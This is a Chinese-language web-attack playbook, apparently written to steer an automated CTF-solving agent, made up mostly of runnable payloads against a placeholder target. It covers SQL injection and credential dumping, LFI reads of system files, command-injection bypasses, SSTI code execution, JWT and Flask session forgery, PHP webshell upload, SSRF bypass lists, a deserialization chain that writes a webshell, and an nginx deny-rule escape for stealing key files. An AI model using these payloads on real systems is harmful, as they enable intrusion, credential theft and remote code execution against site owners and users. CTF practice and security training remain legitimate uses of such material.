## 阶段二：漏洞识别与利用

### 2.1 SQL 注入

**快速检测：**
```bash
# 单引号测试
curl -s "http://TARGET_URL/login" -d "username=admin'&password=x"

# 布尔盲注测试
curl -s "http://TARGET_URL/item?id=1 AND 1=1"
curl -s "http://TARGET_URL/item?id=1 AND 1=2"
```

**sqlmap 自动化：**
```bash
# GET 参数注入
sqlmap -u "http://TARGET_URL/item?id=1" --batch --dbs

# POST 参数注入
sqlmap -u "http://TARGET_URL/login" --data="username=admin&password=test" --batch --dbs

# 指定数据库，列表
sqlmap -u "http://TARGET_URL/item?id=1" --batch -D TARGET_DB --tables
sqlmap -u "http://TARGET_URL/item?id=1" --batch -D TARGET_DB -T TARGET_TABLE --dump

# 绕过 WAF
sqlmap -u "http://TARGET_URL/item?id=1" --batch --tamper=space2comment,between --dbs
```

**手工 Union 注入流程：**
```bash
# 1. 确定列数
curl -s "http://TARGET_URL/item?id=1 ORDER BY 3--"  # 不报错说明有3列
curl -s "http://TARGET_URL/item?id=1 ORDER BY 4--"  # 报错说明只有3列

# 2. 找显示位
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,2,3--"

# 3. 读数据
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--"

# 4. 读文件（需要 FILE 权限）
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,load_file('/etc/passwd'),3--"
```

**常用绕过技巧：**
```
空格绕过：用 /**/ 或 %09（tab）或 %0a（换行）代替空格
关键字绕过：uNiOn SeLeCt 或 UNION/**/SELECT
引号绕过：用 0x十六进制 代替字符串，如 0x666c6167 = 'flag'
```

### 2.2 文件包含（LFI/RFI）

**⚠️ 题型指纹：`download.php?id=<文件名>`、`download?file=`、`export?name=` 这类文件下载参数，
先直接测 LFI（读 `/flag`/`/challenge/flag*`/`/etc/passwd`），不要先去枚举 API 路径**（a-05 教训：
在 api/approve.php 枚举上烧光预算，而 download.php 本身就是任意文件读取）。

**检测：**
```bash
curl -s "http://TARGET_URL/page?file=../../../etc/passwd"
curl -s "http://TARGET_URL/page?file=....//....//....//etc/passwd"
curl -s "http://TARGET_URL/page?file=php://filter/convert.base64-encode/resource=index.php"
# 文件下载参数直接读 flag：
curl -s "http://TARGET_URL/download.php?id=../../challenge/flag.txt"
curl -s "http://TARGET_URL/download.php?id=/challenge/flag.txt"
curl -s "http://TARGET_URL/download.php?id=../flag"
```

**读取源码（PHP）：**
```bash
# base64 编码读取，避免被执行
curl -s "http://TARGET_URL/page?file=php://filter/convert.base64-encode/resource=config.php" | grep -oP '[A-Za-z0-9+/=]{20,}' | head -1 | base64 -d
```

**常见目标文件：**
```
/etc/passwd
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log  （日志注入 getshell）
../config.php
../database.php
```

### 2.3 命令注入

**检测 payload：**
```bash
# 用 sleep 盲注检测
curl -s "http://TARGET_URL/ping?host=127.0.0.1;sleep 3"
curl -s "http://TARGET_URL/ping?host=127.0.0.1|sleep 3"
curl -s "http://TARGET_URL/ping?host=127.0.0.1%0asleep%203"

# 有回显时直接读 flag
curl -s "http://TARGET_URL/ping?host=127.0.0.1;cat /flag"
curl -s "http://TARGET_URL/ping?host=127.0.0.1;find / -name flag 2>/dev/null | head -5 | xargs cat"
```

**绕过过滤：**
```bash
# 空格绕过
cat${IFS}/flag
cat</flag

# 关键词绕过
c''at /flag
ca\t /flag

# 编码绕过
echo "Y2F0IC9mbGFn" | base64 -d | bash
```

### 2.4 SSTI（服务端模板注入）

**检测（各框架通用）：**
```bash
# 数学表达式检测
curl -s "http://TARGET_URL/page?name={{7*7}}"   # 返回 49 → 存在 SSTI
curl -s "http://TARGET_URL/page?name=${7*7}"    # FreeMarker/Thymeleaf
```

**Jinja2（Python/Flask）利用：**
```bash
# 读文件
curl -s "http://TARGET_URL/page?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"

# 通用 payload
curl -s "http://TARGET_URL/page?name={{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag',shell=True,stdout=-1).communicate()[0]}}"
```

### 2.5 JWT 伪造

```bash
# 1. 解码 JWT（base64）
echo "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxx" | cut -d. -f2 | base64 -d 2>/dev/null

# 2. Flask / 资产管理系统：拿 session → 系统枚举隐藏路由
#
# 【通用流程】（多路径，按现场证据选，勿死磕一条）
#   1) 拿 session 的三条路：
#      a. 已有 Set-Cookie：flask-unsign 暴 SECRET_KEY → --sign 伪造 admin
#      b. /login 报 500 或“用户名或密码错误”：先试 SQLi UNION 注入（列数 1..10 逐列试，
#         命中 302 即列数对了；可借 SQLi 回显列读库表）
#      c. 无 cookie 无注入：找 SECRET_KEY 泄露源（git/源码备份/debug 页/配置文件）
#   2) 拿到 session 后【必须】系统枚举 /admin/*、/api/* 前缀的隐藏路由：
#      flag 常见于“带 session/token 的隐藏端点”，不要在已知路由里打转。
#
# --- V1：SECRET_KEY / flask-unsign（仅当已有 session cookie）---
# SECRET_KEY 泄露源（按优先级）：
#   - Git 泄露：/.git/HEAD、/.git/config（能读就用 git-dumper 还原源码）
#   - 源码备份：app.py.bak、config.py~、.swp、app.pyc、__pycache__/、app.py.orig
#   - Debug 页面：Flask debug 模式 /console、Werkzeug debugger
#   - 配置文件：/config、/static/../config.py、/app/config.py、环境变量泄露
#   - 常见默认：secret、secret_key、SECRET_KEY、dev、flask、项目名
# 盲爆破弱密钥（镜像内已装 flask-unsign；若无则用 pip install flask-unsign）：
flask-unsign --unsign --cookie "SESSION_TOKEN" --wordlist /usr/share/wordlists/pass-top1000.txt

# 3. 伪造（知道密钥后）
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'weak_secret'

# 4. alg=none 攻击（手动构造）
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'role':'admin'}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"
```

### 2.6 文件上传绕过

```bash
# 测试允许的扩展名
curl -s -X POST http://TARGET_URL/upload -F "file=@shell.php" -F "filename=shell.php"
curl -s -X POST http://TARGET_URL/upload -F "file=@shell.php;type=image/jpeg" -F "filename=shell.pHp"
curl -s -X POST http://TARGET_URL/upload -F "file=@shell.php" -F "filename=shell.php.jpg"

# PHP webshell 内容
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 测试 webshell
curl -s "http://TARGET_URL/uploads/shell.php?cmd=id"
curl -s "http://TARGET_URL/uploads/shell.php?cmd=find+/+−name+flag+2>/dev/null"
```

### 2.7 SSRF

**基础检测：**
```bash
# 内网探测
curl -s "http://TARGET_URL/fetch?url=http://127.0.0.1:80"
curl -s "http://TARGET_URL/fetch?url=http://192.168.1.1"

# 读取本地文件
curl -s "http://TARGET_URL/fetch?url=file:///etc/passwd"
curl -s "http://TARGET_URL/fetch?url=file:///flag"
```

**❗ SSRF URL 绕过系统化流程（按优先级逐个尝试，每种只试 1 次）：**

```python
import urllib.parse

# === 第 1 组：IP 形式变体 ===
payloads_ip = [
    "http://127.0.0.1/",
    "http://127.1/",
    "http://0.0.0.0/",
    "http://0x7f000001/",            # 十六进制
    "http://2130706433/",            # 十进制
    "http://0177.0.0.1/",            # 八进制
    "http://[::1]/",                 # IPv6
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
]

# === 第 2 组：DNS 重绑定 ===
payloads_dns = [
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",          # 解析到 127.0.0.1
    "http://spoofed.burpcollaborator.net/",  # 如有自己的 DNS
]

# === 第 3 组：URL 解析差异 ===
payloads_parse = [
    "http://evil.com@127.0.0.1/",    # userinfo 混淆
    "http://127.0.0.1#@evil.com/",   # fragment 混淆
    "http://127.0.0.1%00@evil.com/", # null byte
    "http://127.0.0.1\\@evil.com/",  # 反斜杠
    "http:///127.0.0.1/",            # 三斜杠
    "http:\\\\127.0.0.1/",            # 反斜杠协议
]

# === 第 4 组：编码变体 ===
payloads_encode = [
    "http://%31%32%37%2e%30%2e%30%2e%31/",    # 单次 URL 编码
    "http://%25%33%31%25%33%32%25%33%37%2e0%2e0%2e1/",  # 双重编码
    "http://\u0031\u0032\u0037.0.0.1/",      # unicode
]

# === 第 5 组：协议变体 ===
payloads_proto = [
    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a",
    "dict://127.0.0.1:6379/INFO",
    "file:///etc/passwd",
]

# === 第 6 组：Host 头注入 ===
# curl -H 'Host: internal-api' http://TARGET/fetch?url=http://127.0.0.1/

# === 第 7 组：重定向跳转 ===
# 先 SSRF 到自己的服务器，返回 302 跳到内网
# python3 -m http.server + redirect handler

# === 第 8 组：CRLF 注入 ===
payloads_crlf = [
    "http://allowed.com%0d%0aHost:%20127.0.0.1%0d%0a/",
]
```

**SSRF 成功后的标准动作（很多题 flag 在内网 API 中）：**
```bash
# 不要扫端口/网段（每个变体计一次预算，3 次即封）。
# 优先从已泄露的配置/响应确定内网服务地址（如 /debug/config 的 internal_url、
# 响应里的 token/端口），再精确访问一次：
curl -s "http://TARGET/fetch?url=http://<已确认的内网地址>/"

# 读取环境变量（精确的一次请求，最可能直接泄露 flag/凭据）
curl -s "http://TARGET/fetch?url=file:///proc/1/environ" | tr '\0' '\n'
curl -s "http://TARGET/fetch?url=file:///proc/self/environ" | tr '\0' '\n'

# 4. 读取 Web 服务器配置找内网服务
curl -s "http://TARGET/fetch?url=file:///etc/nginx/nginx.conf"
curl -s "http://TARGET/fetch?url=file:///etc/apache2/sites-enabled/000-default.conf"

# 5. 探测已知内网主机名（从配置/代码中发现的）
curl -s "http://TARGET/fetch?url=http://internal-api:5000/"
curl -s "http://TARGET/fetch?url=http://admin-api:8080/"
```

### 2.8 PHP 反序列化攻击（高级）

**系统化流程（必须按顺序执行）：**

```
Step 1: 读取完整源码，列出所有类和魔术方法
    grep -n 'class \|__destruct\|__wakeup\|__toString\|__call\|__get' *.php

Step 2: 找入口点（触发反序列化的方法）
    __destruct() / __wakeup() → 自动触发
    __toString() → 需要对象被当作字符串使用

Step 3: 找 sink（最终执行危险操作的函数）
    file_put_contents() → 写 webshell
    system() / exec() / popen() → 命令执行
    eval() / assert() → 代码执行
    include() / require() → 文件包含

Step 4: 用 Python 生成 payload（禁止手写序列化字符串）
```

**Python 生成 PHP 序列化 payload 模板：**
```python
def php_serialize_string(s):
    b = s.encode('utf-8') if isinstance(s, str) else s
    return f's:{len(b)}:"{b.decode("latin-1")}"'

def php_serialize_object(classname, props):
    """props: dict of {name: serialized_value}"""
    parts = []
    for name, val in props.items():
        parts.append(php_serialize_string(name))
        parts.append(val)
    return f'O:{len(classname)}:"{classname}":{len(props)}:{{{";".join(parts)};}}'

# 示例：构造 POP 链
# class ReportRenderer { public $outputPath; public $content; }
# __destruct() 中调用 file_put_contents($this->outputPath, $this->content)
payload = php_serialize_object('ReportRenderer', {
    'outputPath': php_serialize_string('/var/www/html/shell.php'),
    'content': php_serialize_string('<?php system($_GET["c"]); ?>'),
})
print(payload)
```

**白名单绕过技巧（当嵌套类被拦截时）：**
1. **phar:// 协议**：上传合法扩展名的 phar 文件，通过 `phar://uploads/xxx.jpg` 触发反序列化
2. **属性值注入**：如果只有单层对象能过白名单，尝试在属性值中注入 PHP 代码（如 name 字段写入 webshell 内容）
3. **类名大小写**：PHP 类名不区分大小写，尝试 `reportrenderer` vs `ReportRenderer`
4. **S: 编码字符串**：用 `S:` 代替 `s:` 支持十六进制转义（如 `S:4:"\74est"`）
5. **系统化测试每个属性**：将 renderer/parser/engine 等属性逐个替换为不同类，确认哪些类被放行

### 2.9 JWT kid 攻击（高级）

> **权威 playbook**：`jwt-attacks.md`（CloudFunc / kid 最短链以该文件为准）。
> 本节只做索引，**不要**在这里盲试 `kid=prod.key` 或自行拼 payload——会与 a-18 活路冲突。

**最短入口（按 jwt-attacks.md）：**
1. 优先 `kid=../css/reset.css`（密钥 = 静态文件全文，勿 strip）伪造 admin
2. 业务 API 试不通时转 php-fpm FastCGI
3. 需要完整枚举语料时再查 `payloads/json-web-token.md`

**禁止**：把 `kid=prod.key` 当默认第一步；禁止同时 load 多份 JWT 文档各试一遍。

## nginx location deny 绕过（403 目录逃逸）

`location /keys/ { deny all; }` 这类目录 403 时，用路径归一化逃逸 deny 前缀：

```bash
# 对比 403 vs 404：403=存在但被 deny，404=归一化逃出了 deny 前缀（绕过成功）
curl -s -o /dev/null -w "%{http_code}\n" http://TARGET/keys/prod.key          # 403（基准）
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/.%2e/prod.key"   # 404=绕过命中！
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/../keys/prod.key"
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/./prod.key"
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys../prod.key"      # off-by-slash
```

**关键**：`%2e` 解码为 `.` 后，nginx 路径归一化把 `/.%2e/` 折叠成 `/`，使请求逃出
`/keys/` 的 deny location，从而读到被保护的密钥文件。403→404 的状态码跳变就是逃逸成功的信号，
拿到密钥文件内容后用于 JWT 伪造或直接读取。同理可用于任意 403 目录。

---

